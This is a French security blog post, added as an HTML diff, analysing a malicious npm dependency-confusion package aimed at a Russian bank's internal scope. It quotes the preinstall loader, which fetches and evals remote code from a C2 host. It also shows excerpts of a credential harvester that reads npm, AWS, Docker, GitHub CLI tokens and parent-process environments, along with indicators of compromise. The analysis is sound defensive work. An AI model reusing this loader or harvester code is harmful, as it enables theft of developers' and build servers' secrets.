@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>@bcs-bank-complex-ui/deeplink : analyse d'un credential harvester multi-plateforme ciblant le scope npm interne d'une banque russe - MUAD'DIB</title>
+  <meta name="description" content="Détection live d'un package npm de dependency confusion publié sous le scope @bcs-bank-complex-ui, exfiltration HTTP/DNS multi-plateforme, infrastructure C2 hébergée derrière une façade SaaS russe.">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="@bcs-bank-complex-ui/deeplink : analyse d'un credential harvester multi-plateforme ciblant le scope npm interne d'une banque russe">
+  <meta property="og:description" content="Détection live d'un package npm de dependency confusion publié sous le scope @bcs-bank-complex-ui, exfiltration HTTP/DNS multi-plateforme, infrastructure C2 hébergée derrière une façade SaaS russe.">
+  <meta property="og:image" content="../img/og-default.png">
+  <meta property="og:site_name" content="MUAD'DIB">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="../img/og-default.png">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../vendor/github-dark.min.css">
+  <script src="../vendor/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+
+<nav>
+  <a href="../" class="site-name">muad-dib</a>
+  <a href="../">accueil</a>
+  <a href="./">blog</a>
+  <a href="https://github.com/DNSZLSK/muad-dib" target="_blank" rel="noopener">github</a>
+  <a href="https://www.npmjs.com/package/muaddib-scanner" target="_blank" rel="noopener">npm</a>
+</nav>
+
+<main>
+  <a href="./" class="back-link">&larr; Blog</a>
+
+  <article>
+    <div class="article-meta">
+      <h1>@bcs-bank-complex-ui/deeplink : analyse d'un credential harvester multi-plateforme ciblant le scope npm interne d'une banque russe</h1>
+      <span class="date">2026-05-04</span>
+      <div class="tags">
+        <span class="tag">détection</span>
+        <span class="tag">npm</span>
+        <span class="tag">dependency-confusion</span>
+        <span class="tag">credential-harvester</span>
+        <span class="tag">live</span>
+      </div>
+    </div>
+
+    <div class="article-content">
+
+      <p>Le 2026-05-04 à 09:37 UTC, le package <code>@bcs-bank-complex-ui/deeplink</code> en version <code>99.0.7</code> est publié sur <code>registry.npmjs.org</code>. Une vingtaine de minutes plus tard, MUAD'DIB le flagge avec un score plafonné à 133/100 et huit règles déclenchées simultanément. Le tarball, le serveur C2 et l'infrastructure DNS sont encore actifs au moment de l'analyse, ce qui a permis de récupérer dynamiquement le payload de stage 2 servi par l'opérateur. Un rapport a été soumis à npm Security.</p>
+
+      <p>Cet article documente la détection statique, le contenu du loader, le payload de stage 2 récupéré en direct, l'infrastructure d'exfiltration et les indicateurs de compromission associés. Il signale également le contraste entre la sophistication du collecteur multi-plateforme et la trivialité de la couverture choisie pour héberger le C2.</p>
+
+      <h2>Détection</h2>
+
+      <p>Le package est publié à 09:37 UTC. Le scan automatique le classe en CRITICAL avec un score brut de 133, plafonné à 100 par la règle de scoring. Huit règles distinctes contribuent au score :</p>
+
+      <table>
+        <tr><th>Règle</th><th>ID</th><th>Contribution</th></tr>
+        <tr><td>Chargement de code distant (fetch + eval)</td><td>MUADDIB-AST-040</td><td>+25</td></tr>
+        <tr><td>Exécution de payload en deux étapes</td><td>MUADDIB-FLOW-002</td><td>+25</td></tr>
+        <tr><td>Flux de données suspect</td><td>MUADDIB-FLOW-001</td><td>+25</td></tr>
+        <tr><td>Compound lifecycle + dataflow</td><td>MUADDIB-COMPOUND-007</td><td>+25</td></tr>
+        <tr><td>Version &gt;= 99 + lifecycle hook</td><td>MUADDIB-PKG-019</td><td>+10</td></tr>
+        <tr><td>eval() avec expression dynamique</td><td>MUADDIB-AST-004</td><td>+10</td></tr>
+        <tr><td>Compound lifecycle + dataflow</td><td>MUADDIB-COMPOUND-009</td><td>+10</td></tr>
+        <tr><td>Script lifecycle détecté</td><td>MUADDIB-PKG-001</td><td>+3</td></tr>
+      </table>
+
+      <p>La détection est strictement statique : tous les signaux nécessaires à la classification sont visibles dans le tarball publié, sans qu'il faille exécuter le code ni interroger le serveur C2.</p>
+
+      <h2>Métadonnées du package</h2>
+
+      <p>Données récupérées via <code>curl https://registry.npmjs.org/@bcs-bank-complex-ui/deeplink</code> :</p>
+
+      <table>
+        <tr><th>Champ</th><th>Valeur</th></tr>
+        <tr><td>Nom</td><td><code>@bcs-bank-complex-ui/deeplink</code></td></tr>
+        <tr><td>Version</td><td><code>99.0.7</code></td></tr>
+        <tr><td>Publié le</td><td>2026-05-04T09:37:04.830Z</td></tr>
+        <tr><td>Maintainer</td><td><code>bcs-bank-complex-ui</code></td></tr>
+        <tr><td>Email</td><td><code>bcs-bank-complex-ui@proton.me</code></td></tr>
+        <tr><td>Keywords</td><td><code>bug bounty</code></td></tr>
+        <tr><td>SHA-1 tarball</td><td><code>bd6747dca3752881906c782fa06efbcec02651b8</code></td></tr>
+      </table>
+
+      <p>L'email Proton est jetable. Le nom de compte reproduit littéralement le scope ciblé. La version <code>99.0.7</code> est calibrée pour gagner toute résolution semver face à un package interne dont les versions réelles sont vraisemblablement bien plus basses.</p>
+
+      <h2>Stage 1 : le loader</h2>
+
+      <p>Le tarball ne contient que trois fichiers : <code>package.json</code> (261 octets), <code>preinstall.js</code> (876 octets) et <code>index.js</code> (21 octets, réduit à <code>module.exports = {}</code>). Le seul fichier qui transporte de la logique est <code>preinstall.js</code>, déclenché par le hook <code>preinstall</code> du <code>package.json</code>.</p>
+
+      <h3>package.json</h3>
+
+      <pre><code class="language-json">{
+  "name": "@bcs-bank-complex-ui/deeplink",
+  "version": "99.0.7",
+  "description": "bcs utilities",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node preinstall.js"
+  },
+  "keywords": [
+    "bug bounty"
+  ],
+  "author": "BCS",
+  "license": "ISC"
+}</code></pre>
+
+      <h3>preinstall.js</h3>
+
+      <pre><code class="language-javascript">const http = require("http");
+const fs   = require("fs");
+const path = require("path");
+
+const BASE = "oob.moika.tech";
+
+const raw   = process.env.npm_package_name
+           || (() => {
+                try {
+                  return JSON.parse(
+                    fs.readFileSync(path.join(__dirname, "package.json"), "utf8")
+                  ).name;
+                } catch(_){}
+                return "";
+              })();
+
+const scope = raw.startsWith("@")
+  ? raw.split("/")[0].slice(1).replace(/[^a-z0-9-]/gi, "-") : "x";
+const pkg   = (raw.startsWith("@")
+  ? raw.split("/")[1] : raw).replace(/[^a-z0-9-]/gi, "-");
+
+// Fetches poc.js (safe PoC: whoami/hostname/ifconfig + /etc/passwd only)
+http.get(`http://${pkg}.${scope}.${BASE}/poc.js`, { timeout: 8000 }, (res) =&gt; {
+  let body = "";
+  res.on("data", chunk =&gt; { body += chunk; });
+  res.on("end", () =&gt; { try { eval(body); } catch (_) {} });
+}).on("error", () =&gt; {}).on("timeout", function() { this.destroy(); });</code></pre>
+
+      <p>Le commentaire intégré au loader décrit la charge servie comme <em>safe PoC: whoami/hostname/ifconfig + /etc/passwd only</em>. Le payload récupéré par le même <code>fetch</code> raconte une autre histoire.</p>
+
+      <h2>Stage 2 : le payload servi en direct</h2>
+
+      <p>Récupéré en direct le 2026-05-04 via <code>curl http://deeplink.bcs-bank-complex-ui.oob.moika.tech/poc.js</code>. Le serveur a renvoyé un HTTP 200 et un blob JavaScript de 250 lignes, structuré sous forme d'IIFE. Le contenu est servi dynamiquement par le C2 : ce que reçoit la victime au moment où le hook <code>preinstall</code> se déclenche dépend de ce que l'opérateur sert à cet instant. Le snapshot capturé ici a la valeur d'un instantané, pas d'un binaire signé immuable.</p>
+
+      <p>Cibles de collecte présentes dans le payload capturé :</p>
+
+      <table>
+        <tr><th>Cible</th><th>Méthode</th><th>Sources</th></tr>
+        <tr><td>Infos système</td><td><code>whoami</code>, <code>hostname</code>, <code>uname -a</code>, <code>ip addr</code></td><td>OS, utilisateur, interfaces réseau</td></tr>
+        <tr><td>Fichiers système</td><td><code>readFileSync</code></td><td><code>/etc/passwd</code>, <code>/etc/hosts</code>, <code>/proc/sys/kernel/hostname</code></td></tr>
+        <tr><td>Variables d'environnement</td><td><code>process.env</code>, <code>printenv</code>, <code>/proc/&lt;pid&gt;/environ</code></td><td>Valeurs des env vars du process courant et des processus parents (jusqu'à 8 niveaux remontés via <code>/proc/&lt;ppid&gt;/status</code>)</td></tr>
+        <tr><td>Configs shell</td><td><code>readFileSync</code> + suivi des <code>source</code></td><td><code>.bashrc</code>, <code>.zshrc</code>, <code>.profile</code>, <code>.bash_profile</code>, config fish, <code>/etc/environment</code>, <code>/etc/profile</code></td></tr>
+        <tr><td>Dotfiles sensibles</td><td><code>readFileSync</code></td><td><code>.secrets</code>, <code>.tokens</code>, <code>.api_keys</code>, <code>.credentials</code>, <code>.private</code>, <code>.keys</code></td></tr>
+        <tr><td>Fichiers .env</td><td><code>readFileSync</code> sur 5 niveaux de répertoires</td><td><code>.env</code>, <code>.env.local</code>, <code>.env.production</code>, <code>.env.staging</code>, <code>.env.ci</code>, <code>config/.env</code> et 11 variantes supplémentaires</td></tr>
+        <tr><td>Tokens npm</td><td>Parseur <code>.npmrc</code></td><td><code>~/.npmrc</code>, <code>$CWD/.npmrc</code></td></tr>
+        <tr><td>Tokens Yarn</td><td>Parseur <code>.yarnrc.yml</code></td><td><code>npmAuthToken</code>, <code>npmRegistryServer</code></td></tr>
+        <tr><td>Tokens pnpm</td><td>Parseur compatible <code>.npmrc</code></td><td><code>~/.config/pnpm/rc</code></td></tr>
+        <tr><td>Credentials AWS</td><td>Parseur INI</td><td><code>~/.aws/credentials</code>, <code>~/.aws/config</code></td></tr>
+        <tr><td>Auth Docker</td><td>Parseur JSON + décodage Base64</td><td><code>~/.docker/config.json</code> (champ <code>auth</code>)</td></tr>
+        <tr><td>.netrc</td><td>Parseur dédié</td><td><code>~/.netrc</code>, <code>~/_netrc</code> (login + password)</td></tr>
+        <tr><td>Config Git</td><td>Parseur INI</td><td><code>~/.gitconfig</code></td></tr>
+        <tr><td>Credentials PyPI</td><td>Parseur INI</td><td><code>~/.pypirc</code></td></tr>
+        <tr><td>Gradle properties</td><td>Parseur env</td><td><code>~/.gradle/gradle.properties</code></td></tr>
+        <tr><td>Credentials Cargo</td><td>Parseur INI</td><td><code>~/.cargo/credentials.toml</code></td></tr>
+        <tr><td>Config pip</td><td>Parseur INI</td><td><code>pip.conf</code> / <code>pip.ini</code></td></tr>
+        <tr><td>Token GitHub CLI</td><td>Regex YAML</td><td><code>~/.config/gh/hosts.yml</code> (<code>oauth_token</code>)</td></tr>
+        <tr><td>Registre Windows</td><td><code>reg query</code></td><td><code>HKCU\Environment</code>, <code>HKLM\...\Session Manager\Environment</code></td></tr>
+        <tr><td>Env du login shell</td><td>Spawn bash/zsh/sh avec sourcing des profiles</td><td>Capture les env vars invisibles à <code>process.env</code></td></tr>
+      </table>
+
+      <p>Toute la collecte est ensuite concaténée dans un blob texte unique et envoyée par <code>POST /report</code> sur l'OAST en HTTP non chiffré.</p>
+
+      <p>Deux extraits du payload, cités sans modification :</p>
+
+      <p>Collecte des credentials AWS, Docker, GitHub CLI et <code>.netrc</code> :</p>
+
+      <pre><code class="language-javascript">function collectConfigFiles() {
+  const r = {};
+  const cwd = process.cwd();
+
+  // npm tokens
+  for (const fp of [path.join(cwd, ".npmrc"), path.join(HOME, ".npmrc")]) {
+    const c = readFile(fp); if (c) Object.assign(r, parseNpmrc(c));
+  }
+
+  // AWS credentials
+  const awsCred = readFile(path.join(HOME, ".aws", "credentials"));
+  if (awsCred) Object.assign(r, parseIni(awsCred, "AWS_"));
+
+  // Docker auth (décode le Base64)
+  const docker = readFile(path.join(HOME, ".docker", "config.json"));
+  if (docker) Object.assign(r, parseDockerConfig(docker));
+
+  // .netrc (login + password en clair)
+  const netrc = readFile(path.join(HOME, ".netrc"))
+             || readFile(path.join(HOME, "_netrc"));
+  if (netrc) Object.assign(r, parseNetrc(netrc));
+
+  // GitHub CLI token
+  const ghHosts = readFile(path.join(HOME, ".config", "gh", "hosts.yml"));
+  if (ghHosts) {
+    const m = ghHosts.match(/oauth_token:\s*([^\s\r\n]+)/);
+    if (m) r["GH_CLI_TOKEN"] = m[1];
+  }
+
+  return r;
+}</code></pre>
+
+      <p>Remontée de l'arbre des processus parents via <code>/proc</code>, qui permet de capturer des variables d'environnement injectées par un orchestrateur (CI runner, conteneur init, agent build) qui ne sont pas accessibles au process Node lui-même :</p>
+
+      <pre><code class="language-javascript">function collectProcEnvs() {
+  if (IS_WIN || IS_MAC || !fs.existsSync("/proc")) return {};
+  const r = {};
+  const visited = new Set();
+  let pid = process.ppid;
+  for (let i = 0; i &lt; 8; i++) {
+    if (!pid || pid &lt;= 1 || visited.has(pid)) break;
+    visited.add(pid);
+    const envRaw = readFile(`/proc/${pid}/environ`);
+    if (envRaw) {
+      for (const entry of envRaw.split("\0")) {
+        const idx = entry.indexOf("=");
+        if (idx &gt; 0) {
+          const k = entry.slice(0, idx);
+          if (k &amp;&amp; !(k in r)) r[k] = entry.slice(idx + 1);
+        }
+      }
+    }
+    const status = readFile(`/proc/${pid}/status`);
+    if (!status) break;
+    const m = status.match(/^PPid:\s+(\d+)/m);
+    pid = m ? parseInt(m[1]) : null;
+  }
+  return r;
+}</code></pre>
+
+      <h2>Infrastructure d'exfiltration</h2>
+
+      <p>Le payload construit un sous-domaine dynamique qui encode l'identité de la victime :</p>
+
+      <pre><code class="language-text">${pkg}.${scope}.${osName}-${user}.${host}.oob.moika.tech
+
+Exemple :
+deeplink.bcs-bank-complex-ui.linux-jenkins.build-server-04.oob.moika.tech</code></pre>
+
+      <p>Le domaine est configuré en wildcard DNS : tous les sous-domaines résolvent vers la même adresse. L'attaquant identifie chaque victime par le sous-domaine seul. Même si le POST HTTP est bloqué par un firewall sortant, la résolution DNS suffit à confirmer l'exécution du loader sur la machine cible et à transporter une partie de l'identifiant de victime.</p>
+
+      <h3>Enregistrement du domaine</h3>
+
+      <table>
+        <tr><th>Champ</th><th>Valeur</th></tr>
+        <tr><td>Domaine</td><td><code>moika.tech</code></td></tr>
+        <tr><td>Registrar</td><td>REG.RU LLC (IANA ID 1606)</td></tr>
+        <tr><td>Créé le</td><td>2026-03-14</td></tr>
+        <tr><td>Nameservers</td><td><code>ns1.reg.ru</code>, <code>ns2.reg.ru</code></td></tr>
+        <tr><td>DNSSEC</td><td>non signé</td></tr>
+      </table>
+
+      <h3>Hébergement</h3>
+
+      <table>
+        <tr><th>Champ</th><th>Valeur</th></tr>
+        <tr><td>IP</td><td><code>72.56.97.200</code></td></tr>
+        <tr><td>ASN</td><td>AS210976 (Timeweb, LLP)</td></tr>
+        <tr><td>Localisation</td><td>Amsterdam, NL</td></tr>
+        <tr><td>Statut au moment de l'analyse</td><td>HTTP 200 (actif)</td></tr>
+      </table>
+
+      <h3>La façade</h3>
+
+      <p>Le domaine racine <code>moika.tech</code> sert un produit SaaS d'apparence légitime : MOIKA, système de réservation Telegram pour stations de lavage automobile (автомойки). Landing page travaillée (branding, mockup d'application, navigation Экосистема / Возможности / Тарифы), claims chiffrés affichés en page d'accueil ("500+ автомоек", "2 млн уведомлений", "98% возвращаются"), tarifs en roubles, témoignages localisés à Moscou, Ekaterinbourg et Kazan. Le serveur OAST de cette campagne tourne en sous-domaine (<code>oob.moika.tech</code>) sous cette vitrine commerciale, partageant la même IP et la même infrastructure DNS que le site public.</p>
+
+      <figure style="margin: 1rem 0;">
+        <img src="../img/moika-tech-landing.png" alt="Page d'accueil de moika.tech : SaaS de réservation Telegram pour stations de lavage auto, en russe, avec claims chiffrés et mockup d'app." style="max-width: 100%; height: auto; border: 1px solid #1a1a1a;">
+        <figcaption style="font-size: 12px; color: #555; margin-top: 0.4rem; font-family: Consolas, monospace;">moika.tech, page d'accueil capturée le 2026-05-04. Branding "MOIKA", revendications "500+ автомоек / 2 млн уведомлений / 98% возвращаются", mockup d'app Telegram à droite. Le sous-domaine <code>oob.moika.tech</code> partage la même IP que ce site.</figcaption>
+      </figure>
+
+      <h3>Empreinte web : nulle</h3>
+
+      <p>Trois recherches web ciblées (<code>"moika.tech" автомойка Telegram</code>, <code>"moika.tech" car wash SaaS booking</code>, <code>"moika.tech" review отзыв</code>) ne renvoient aucun résultat parlant du domaine lui-même. Tous les hits concernent des produits homonymes mais sans rapport : <code>moika.online</code>, <code>moika2x2.ru</code>, <code>moika.com.ua</code> (boutique ukrainienne), la franchise Digital Moika, des produits de cosmétique coréenne, ou des bots Telegram tiers de réservation auto-lavage. Aucun avis, aucun article presse, aucun annuaire d'apps Telegram, aucune mention sociale, aucun classement vendor n'évoque le domaine.</p>
+
+      <p>Pour un SaaS qui revendique en page d'accueil 500 stations clientes et 2 millions de notifications envoyées, l'absence totale d'empreinte publique est anormale. Plusieurs signaux convergent et sont compatibles avec une page générée par un LLM et publiée pour étoffer la couverture du domaine :</p>
+
+      <ul>
+        <li>Domaine enregistré le 2026-03-14, soit sept semaines avant la publication du package npm : pas de longévité d'exploitation possible.</li>
+        <li>Témoignages génériques (<em>"Андрей К., Москва"</em>, <em>"Светлана М., Екатеринбург"</em>, <em>"Дмитрий Р., Казань"</em>) sans nom complet, sans station identifiable, sans photo authentifiable, sans empreinte sociale latérale.</li>
+        <li>Chiffres ronds non sourcés ("500+", "2 млн", "98%") sans étude, sans dashboard d'opérateur, sans communiqué relayé.</li>
+        <li>Aucune référence dans les annuaires russophones d'apps Telegram, ni dans les comparatifs SaaS B2B locaux où un produit revendiquant 500 clients aurait normalement une trace.</li>
+      </ul>
+
+      <p>Cette observation fait tomber l'hypothèse "produit réel exploité parallèlement par son propriétaire" et "détournement DNS d'un site existant" : il n'y a pas de site préexistant à détourner ni de produit en exploitation à exploiter. La lecture la plus parcimonieuse de l'ensemble est que <code>moika.tech</code> est une vitrine fabriquée pour la campagne, hébergée sur la même IP que <code>oob.moika.tech</code> afin de présenter à un visiteur web (ou à un défenseur en triage initial) un domaine qui ne ressemble pas à un C2.</p>
+
+      <h2>La cible : BCS Financial Group</h2>
+
+      <p>BCS Financial Group (БКС) est l'un des plus grands groupes financiers privés de Russie, fondé en 1995 à Novossibirsk. Le groupe comprend BCS Bank (licence bancaire depuis 1989), BCS Prime Brokerage à Londres, et des bureaux à Moscou, New York et Chypre. Effectif déclaré entre 1000 et 5000 personnes selon les sources.</p>
+
+      <p>Le scope <code>@bcs-bank-complex-ui</code> n'existait pas sur le registre public npm avant la publication de l'attaquant. Aucun autre package sous ce scope n'est présent sur <code>npmjs.com</code> au moment de la vérification : <code>core</code>, <code>ui</code>, <code>common</code>, <code>utils</code>, <code>shared</code>, <code>components</code>, <code>auth</code>, <code>api</code> et <code>config</code> retournent tous HTTP 404. Le nom <code>complex-ui</code> est trop spécifique pour avoir été tiré au hasard. L'attaquant connaissait ce scope, soit par leak (fichier JS public, stack trace, offre d'emploi, dépôt GitHub indexé), soit par reconnaissance active sur des artefacts internes exposés.</p>
+
+      <h2>Comment fonctionne la dependency confusion sur ce scope</h2>
+
+      <p>Les packages internes d'entreprise ne sont pas hébergés sur le registre public npm. Ils sont publiés sur des registres privés (Artifactory, Verdaccio, Nexus, GitHub Packages) accessibles uniquement depuis le réseau interne ou via des credentials privées. Si <code>@bcs-bank-complex-ui</code> existe sur le registre privé de BCS Financial, il n'avait jamais été réservé sur le registre public <code>npmjs.com</code>.</p>
+
+      <p>L'attaquant publie un package sous ce scope sur le public en version <code>99.0.7</code>. Quand un développeur de la cible lance <code>npm install</code>, si la configuration npm n'est pas explicitement verrouillée sur le registre interne pour ce scope (via <code>.npmrc</code> avec <code>@bcs-bank-complex-ui:registry=https://internal.example.com/</code>), le client interroge les deux registres en parallèle. Une version <code>2.x</code> côté interne et une version <code>99.0.7</code> côté public donnent <code>99.0.7</code> à la résolution semver. Le hook <code>preinstall</code> s'exécute avant tout code utilisateur, sans interaction utilisateur ni signal visible.</p>
+
+      <h2>Indices contradictoires sur l'intention</h2>
+
+      <p>Plusieurs signaux du package et de son loader pourraient laisser penser à un test de sécurité maladroit plutôt qu'à une opération malveillante :</p>
+
+      <ul>
+        <li>Version <code>99.0.7</code> : un attaquant cherchant la discrétion choisirait un numéro plausible (par exemple <code>3.1.2</code>), pas une version qui annonce explicitement une dependency confusion.</li>
+        <li>Keyword <code>bug bounty</code> placé dans les métadonnées du <code>package.json</code>.</li>
+        <li>Commentaire <code>// Fetches poc.js (safe PoC: whoami/hostname/ifconfig + /etc/passwd only)</code> dans le loader.</li>
+        <li>Email Proton qui reproduit littéralement le scope cible (<code>bcs-bank-complex-ui@proton.me</code>) au lieu d'utiliser un alias générique.</li>
+        <li>Exfiltration en HTTP non chiffré, sans authentification, sans persistance, sans reverse shell, sans worm de propagation.</li>
+      </ul>
+
+      <p>Plusieurs autres signaux tirent dans la direction opposée :</p>
+
+      <ul>
+        <li>Le payload servi par le C2 est un harvester de 250 lignes qui dépasse très largement la portée annoncée par le commentaire (<em>whoami/hostname/ifconfig + /etc/passwd only</em>) : remontée de 8 niveaux de <code>/proc/&lt;ppid&gt;/environ</code>, décodage Base64 des tokens Docker, suivi des chaînes <code>source</code> dans <code>.bashrc</code> / <code>.zshrc</code> / <code>.profile</code>, parsing dédié pour au moins 12 formats de credentials distincts (npm, Yarn, pnpm, AWS, Docker, .netrc, Git, PyPI, Gradle, Cargo, pip, GitHub CLI), et branche dédiée pour l'export du registre Windows.</li>
+        <li>Le payload est servi dynamiquement par le C2, donc modifiable à tout instant : la version de stage 2 capturée par MUAD'DIB n'engage pas l'opérateur sur ce qui sera servi à la prochaine victime.</li>
+        <li>Le domaine de façade <code>moika.tech</code> n'a aucune empreinte web, aucun client identifiable, aucun avis, et a été enregistré sept semaines avant la publication du package : la couverture est fabriquée, pas exploitée.</li>
+        <li>Les destinataires effectifs de l'exécution ne sont pas BCS Financial (qui ne résoudrait <code>@bcs-bank-complex-ui</code> que si sa configuration interne le permettait) mais aussi tout tiers qui taperait ce scope par erreur ou par confusion. Un programme de bug bounty éventuel ne couvre pas l'exécution chez ces tiers, qui ne sont pas parties au programme.</li>
+      </ul>
+
+      <p>Un proof-of-concept de bug bounty crédible se limiterait à un ping OAST avec <code>hostname</code> et <code>os.type()</code>, sans collecte de credentials. Le code servi ici n'est pas un PoC, c'est un harvester opérationnel. Que l'opérateur prévoie ou non d'invoquer un programme bug bounty pour se défendre a posteriori, la nature du code exécuté chez les victimes ne change pas.</p>
+
+      <h2>Ce que nous ne pouvons pas confirmer</h2>
+
+      <ul>
+        <li>L'identité de l'opérateur n'est pas établie. L'infrastructure (REG.RU, Timeweb LLP, vitrine SaaS russophone) est compatible avec un opérateur russophone mais ne suffit pas à attribuer.</li>
+        <li>L'existence ou non d'un programme bug bounty privé de BCS Financial qui couvrirait ce mode de publication n'est pas confirmée publiquement.</li>
+        <li>Le payload de stage 2 cité ici est un instantané du blob servi le 2026-05-04. Le serveur peut servir une charge différente à un autre moment ou à un autre client, et ce qu'a effectivement reçu une victime donnée ne peut pas être reconstitué a posteriori sans logs de l'opérateur.</li>
+        <li>L'absence d'empreinte web pour <code>moika.tech</code> est observable sur les moteurs publics ; nous n'excluons pas une présence dans des canaux fermés (Telegram privés, intranets) que ces recherches ne couvrent pas.</li>
+      </ul>
+
+      <h2>Indicateurs de compromission</h2>
+
+      <table>
+        <tr><th>Type</th><th>Valeur</th></tr>
+        <tr><td>Package</td><td><code>@bcs-bank-complex-ui/deeplink@99.0.7</code></td></tr>
+        <tr><td>SHA-1 tarball</td><td><code>bd6747dca3752881906c782fa06efbcec02651b8</code></td></tr>
+        <tr><td>Intégrité</td><td><code>sha512-s2rm42EOTfYrl[...]ZOn7ke2HKRIPg==</code></td></tr>
+        <tr><td>Domaine C2</td><td><code>oob.moika.tech</code> (wildcard sous-domaines)</td></tr>
+        <tr><td>IP C2</td><td><code>72.56.97.200</code></td></tr>
+        <tr><td>ASN</td><td>AS210976 (Timeweb LLP)</td></tr>
+        <tr><td>Registrar</td><td>REG.RU LLC</td></tr>
+        <tr><td>Domaine créé le</td><td>2026-03-14</td></tr>
+        <tr><td>Email maintainer</td><td><code>bcs-bank-complex-ui@proton.me</code></td></tr>
+        <tr><td>Domaine de façade</td><td><code>moika.tech</code> (SaaS lavage auto, même IP)</td></tr>
+      </table>
+
+      <h2>Chronologie</h2>
+
+      <table>
+        <tr><th>Date / heure (UTC)</th><th>Évènement</th></tr>
+        <tr><td>2026-03-14</td><td>Domaine <code>moika.tech</code> enregistré via REG.RU.</td></tr>
+        <tr><td>2026-05-04 09:37</td><td>Package <code>@bcs-bank-complex-ui/deeplink@99.0.7</code> publié sur <code>registry.npmjs.org</code>.</td></tr>
+        <tr><td>2026-05-04, ~20 min plus tard</td><td>Détection MUAD'DIB (score 133/100, plafonné, 8 règles).</td></tr>
+        <tr><td>2026-05-04</td><td>Triage manuel : tarball récupéré, payload de stage 2 capturé en direct, forensique d'infrastructure complétée.</td></tr>
+        <tr><td>2026-05-04</td><td>Rapport soumis à npm Security.</td></tr>
+      </table>
+
+      <p>Cet article sera mis à jour si npm Security retire le package, si une information complémentaire (réponse de BCS Financial, takedown DNS, partage d'IOCs par un tiers) modifie le tableau présenté.</p>
+
+      <p><em>Dernière vérification : 2026-05-04.</em></p>
+
+    </div>
+  </article>
+</main>
+
+<footer>
+  MUAD'DIB / DNSZLSK / <a href="https://github.com/DNSZLSK/muad-dib" target="_blank" rel="noopener">source</a>
+</footer>
+
+</body>
+</html>
